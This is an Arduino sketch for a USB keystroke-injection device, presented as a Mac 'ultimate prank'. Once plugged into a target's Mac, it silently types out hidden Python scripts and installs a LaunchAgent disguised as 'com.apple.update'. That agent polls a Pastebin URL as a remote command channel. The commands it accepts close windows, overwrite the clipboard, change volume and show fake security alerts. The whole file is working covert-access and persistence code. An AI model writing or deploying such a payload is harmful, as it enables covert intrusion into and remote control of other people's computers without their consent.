#include <Keyboard.h>

// Arduino Pro Micro / Leonardo — Mac Ultimate Prank
// !! Replace XXXXXXXX with your own Pastebin raw ID before flashing !!
// See README.md for how to create your Pastebin.
//
// HOW IT WORKS:
//   1. Plug in — all prank scripts are silently installed. Nothing happens yet.
//   2. Remove the Arduino. Target has no idea.
//   3. Type a command into your Pastebin. It fires once within ~30 seconds.
//   4. Clear/change the Pastebin to fire again.
//
// PASTEBIN COMMAND FORMAT (one per line):
//   COMMAND              — fires once immediately, ~30s delay
//   COMMAND HH:MM        — fires once at that time of day
//   STOP                 — kills everything, removes all files
//
// EXAMPLE PASTE:
//   JIGGLE
//   SPEECH
//   NOTIFY 14:30
//   STOP 22:00
//
// COMMANDS: JIGGLE MINIMISE SOUND NOTIFY CLIPBOARD ZOOM
//           CAPS VOLUME CLOSE SPEECH DARK INVERT STOP

void typeln(const char* s) {
  Keyboard.print(s);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(120);
}

void setup() {
  Keyboard.begin();
  delay(5000);

  // Cmd+Space → Spotlight → Terminal
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();
  delay(1200);
  Keyboard.print("Terminal");
  delay(500);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(4000);

  // === 1. JIGGLE — Teleports mouse once to a random position ===
  typeln("cat>/tmp/.j.py<<'E'");
  typeln("import random");
  typeln("from Quartz import CGWarpMouseCursorPosition");
  typeln("CGWarpMouseCursorPosition((random.randint(0,3840),random.randint(0,2160)))");
  typeln("E");

  // === 2. MINIMISE — Minimises the frontmost window once ===
  typeln("cat>/tmp/.w.py<<'E'");
  typeln("import subprocess");
  typeln("subprocess.run(['osascript','-e','tell application \"System Events\" to keystroke \"m\" using {command down}'])");
  typeln("E");

  // === 3. SOUND — Plays a random macOS system sound once ===
  typeln("cat>/tmp/.s.py<<'E'");
  typeln("import subprocess,random,glob");
  typeln("s=glob.glob('/System/Library/Sounds/*.aiff')");
  typeln("subprocess.run(['afplay',random.choice(s)])");
  typeln("E");

  // === 4. NOTIFY — Shows a fake critical error notification once ===
  typeln("cat>/tmp/.n.py<<'E'");
  typeln("import subprocess,random");
  typeln("t=['Critical Error','Security Warning','System Failure','Disk Error','Memory Fault','Network Breach']");
  typeln("m=['A critical system error has occurred','Suspicious activity detected on this Mac','macOS has stopped working correctly','Hard drive read error. Backup data immediately','RAM allocation failure. Restart required','Unauthorised remote access attempt blocked']");
  typeln("i=random.randint(0,5)");
  typeln("subprocess.run(['osascript','-e','display notification \"'+m[i]+'\" with title \"'+t[i]+'\"'])");
  typeln("E");

  // === 5. CLIPBOARD — Replaces clipboard with a taunting message once ===
  typeln("cat>/tmp/.c.py<<'E'");
  typeln("import subprocess,random");
  typeln("m=['what did you copy','nice try','I already read that','that belongs to me now','clipboard accessed','did you mean to copy that']");
  typeln("subprocess.run(['bash','-c','echo \"'+random.choice(m)+'\" | pbcopy'])");
  typeln("E");

  // === 6. ZOOM — Zooms in once (Cmd+=) ===
  typeln("cat>/tmp/.z.py<<'E'");
  typeln("import subprocess");
  typeln("subprocess.run(['osascript','-e','tell application \"System Events\" to keystroke \"=\" using {command down}'])");
  typeln("E");

  // === 7. CAPS — Toggles caps lock once ===
  typeln("cat>/tmp/.k.py<<'E'");
  typeln("import subprocess");
  typeln("subprocess.run(['osascript','-e','tell application \"System Events\" to key code 57'])");
  typeln("E");

  // === 8. VOLUME — Sets volume to a random level once ===
  typeln("cat>/tmp/.v.py<<'E'");
  typeln("import subprocess,random");
  typeln("subprocess.run(['osascript','-e','set volume output volume '+str(random.randint(0,100))])");
  typeln("E");

  // === 9. CLOSE — Closes the frontmost tab/window once (Cmd+W) ===
  typeln("cat>/tmp/.x.py<<'E'");
  typeln("import subprocess");
  typeln("subprocess.run(['osascript','-e','tell application \"System Events\" to keystroke \"w\" using {command down}'])");
  typeln("E");

  // === 10. SPEECH — Mac says something out loud once ===
  typeln("cat>/tmp/.p.py<<'E'");
  typeln("import subprocess,random");
  typeln("m=['Hi','Message from PC','Hi there','Hello','Can you hear me','I am your computer']");
  typeln("subprocess.Popen(['say',random.choice(m)])");
  typeln("E");

  // === 11. DARK — Toggles dark/light mode once ===
  typeln("cat>/tmp/.d.py<<'E'");
  typeln("import subprocess");
  typeln("subprocess.run(['osascript','-e','tell app \"System Events\" to tell appearance preferences to set dark mode to not dark mode'])");
  typeln("E");

  // === 12. INVERT — Inverts all screen colours once (Cmd+Option+Ctrl+8) ===
  typeln("cat>/tmp/.r.py<<'E'");
  typeln("import subprocess");
  typeln("subprocess.run(['osascript','-e','tell application \"System Events\" to keystroke \"8\" using {command down, option down, control down}'])");
  typeln("E");

  // === Pastebin watcher + LaunchAgent persistence /tmp/.t.py ===
  // Polls every 30 seconds. Each command fires once then is ignored until
  // the Pastebin content changes (tracked by last seen content hash).
  typeln("cat>/tmp/.t.py<<'E'");
  typeln("import subprocess,time,urllib.request,plistlib,os,pathlib,datetime,hashlib");
  typeln("la=os.path.expanduser('~/Library/LaunchAgents/com.apple.update.plist')");
  typeln("pathlib.Path(os.path.dirname(la)).mkdir(exist_ok=True)");
  typeln("if not os.path.exists(la):");
  typeln(" d={'Label':'com.apple.update','ProgramArguments':['/usr/bin/python3','/tmp/.t.py'],'RunAtLoad':True}");
  typeln(" open(la,'wb').write(plistlib.dumps(d))");
  typeln(" subprocess.run(['launchctl','load',la])");
  typeln("fs={'JIGGLE':'/tmp/.j.py','MINIMISE':'/tmp/.w.py','SOUND':'/tmp/.s.py','NOTIFY':'/tmp/.n.py','CLIPBOARD':'/tmp/.c.py','ZOOM':'/tmp/.z.py','CAPS':'/tmp/.k.py','VOLUME':'/tmp/.v.py','CLOSE':'/tmp/.x.py','SPEECH':'/tmp/.p.py','DARK':'/tmp/.d.py','INVERT':'/tmp/.r.py'}");
  typeln("URL='https://pastebin.com/raw/XXXXXXXX'");
  typeln("def fetch():");
  typeln(" try:return urllib.request.urlopen(URL,timeout=5).read().decode().strip()");
  typeln(" except:return ''");
  typeln("fired=set()");
  typeln("while True:");
  typeln(" txt=fetch()");
  typeln(" h=hashlib.md5(txt.encode()).hexdigest()");
  typeln(" now=datetime.datetime.now()");
  typeln(" stop=False");
  typeln(" for ln in txt.splitlines():");
  typeln("  parts=ln.strip().split()");
  typeln("  if not parts:continue");
  typeln("  cmd=parts[0]");
  typeln("  scheduled=len(parts)>=2 and ':' in parts[1]");
  typeln("  if scheduled:");
  typeln("   try:");
  typeln("    sh,sm=map(int,parts[1].split(':'))");
  typeln("    key=(cmd,sh,sm,str(now.date()))");
  typeln("    if now.hour==sh and abs(now.minute-sm)<1 and key not in fired:");
  typeln("     fired.add(key)");
  typeln("     if cmd=='STOP':stop=True;break");
  typeln("     if cmd in fs:subprocess.Popen(['python3',fs[cmd]])");
  typeln("   except:pass");
  typeln("  else:");
  typeln("   key=(cmd,h)");
  typeln("   if key not in fired:");
  typeln("    fired.add(key)");
  typeln("    if cmd=='STOP':stop=True;break");
  typeln("    if cmd in fs:subprocess.Popen(['python3',fs[cmd]])");
  typeln(" if stop:");
  typeln("  subprocess.run(['launchctl','unload',la])");
  typeln("  try:os.remove(la)");
  typeln("  except:pass");
  typeln("  for f in fs.values():");
  typeln("   subprocess.run(['pkill','-f',f])");
  typeln("   try:os.remove(f)");
  typeln("   except:pass");
  typeln("  break");
  typeln(" time.sleep(30)");
  typeln("E");

  // Install Quartz, launch watcher silently, hide Terminal
  typeln("python3 -m pip install pyobjc-framework-Quartz -q;nohup python3 /tmp/.t.py&disown;osascript -e 'tell app \"Terminal\" to set miniaturized of every window to true'");
}
void loop() {}
